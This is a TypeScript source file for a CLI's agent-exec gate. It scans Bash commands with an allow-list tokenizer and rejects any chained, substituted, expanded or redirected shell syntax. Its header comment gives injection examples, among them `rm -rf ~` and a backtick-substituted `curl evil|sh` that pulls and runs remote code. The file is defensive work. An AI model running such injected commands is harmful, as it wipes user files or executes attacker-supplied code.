// packages/@monomind/cli/src/orgrt/agent-exec-shell-syntax.ts
// Split out of agent-exec.ts (file-size rule): the scoped-mode Bash
// metacharacter scanner used by agent exec's canUseTool gate.

// A prefix match on its own only checks the FIRST token — the whole string
// still runs through a real shell, so `monomind org list; rm -rf ~` or
// `` monomind org list `curl evil|sh` `` would pass a bare startsWith()
// check and then execute the injected part too. This scanner is the ONLY
// enforcement of "one literal invocation, nothing chained, substituted,
// expanded or redirected".
//
// Design: an ALLOW-LIST tokenizer, not a deny-list. A deny-list has to model
// every bash quoting corner (it once missed `\'` outside quotes, and then
// ANSI-C quoting: in `$'\''` bash sees ONE quoted `'` while a plain
// quote-toggle sees quote/backslash/quote/quote and believes everything after
// is inside single quotes — issue #702). Instead the command is accepted only
// if it is a sequence of words, each a concatenation of:
//   - bare runs of [A-Za-z0-9._:/=@+,%~^-] (a `~` is never first in a word or
//     right after `=` / `:`, where bash would tilde-expand; a word never
//     starts with `=`, which zsh expands to a command path);
//   - `\` plus one printable ASCII character (an escaped character is literal
//     to bash, never a quote or operator);
//   - '...' single-quoted text: bash treats everything inside as literal, so
//     any text without a `'`, a control character or a line separator is fine;
//   - "..." double-quoted text limited to characters with no meaning in
//     double quotes: no `\`, `$`, backtick, `!`, `"`, control characters or
//     line separators.
// Words are separated by spaces or tabs only. Anything else outside quotes —
// `$` (so `$'..'`, `$".."`, `${`, `$(`), other backslashes, backtick, `;`, `&`, `|`,
// `<`, `>`, `(`, `)`, `{`, `}`, `*`, `?`, `[`, `!`, `#` at a word start,
// newlines, non-ASCII — is unsafe, and so is an unterminated quote. Fail
// closed: if the tokenizer does not positively recognise it, it is unsafe.

const BARE = /[A-Za-z0-9._:/=@+,%~^-]/;
// C0 controls (incl. NUL, tab, newline, CR), DEL, C1 controls (incl. NEL),
// and the Unicode line/paragraph separators.
const UNQUOTABLE = /[\u0000-\u001f\u007f-\u009f\u2028\u2029]/;
const ESCAPABLE = /[ -~]/;
const DOUBLE_QUOTE_UNSAFE = /[\\$`!"]/;

export const hasUnsafeShellSyntax = (cmd: string): boolean => {
  let i = 0;
  const n = cmd.length;
  let atWordStart = true;
  while (i < n) {
    const c = cmd[i];
    if (c === ' ' || c === '\t') {
      atWordStart = true;
      i++;
      continue;
    }
    if (c === "'" || c === '"') {
      const end = cmd.indexOf(c, i + 1);
      if (end === -1) return true; // unterminated
      const body = cmd.slice(i + 1, end);
      if (UNQUOTABLE.test(body)) return true;
      if (c === '"' && DOUBLE_QUOTE_UNSAFE.test(body)) return true;
      i = end + 1;
      atWordStart = false;
      continue;
    }
    if (c === '\\') {
      if (i + 1 >= n || !ESCAPABLE.test(cmd[i + 1])) return true; // incl. a lone trailing `\`
      atWordStart = false;
      i += 2;
      continue;
    }
    if (!BARE.test(c)) return true;
    if (c === '=' && atWordStart) return true; // zsh `=cmd` expansion
    if (c === '~' && (atWordStart || cmd[i - 1] === '=' || cmd[i - 1] === ':')) return true;
    atWordStart = false;
    i++;
  }
  return false;
};
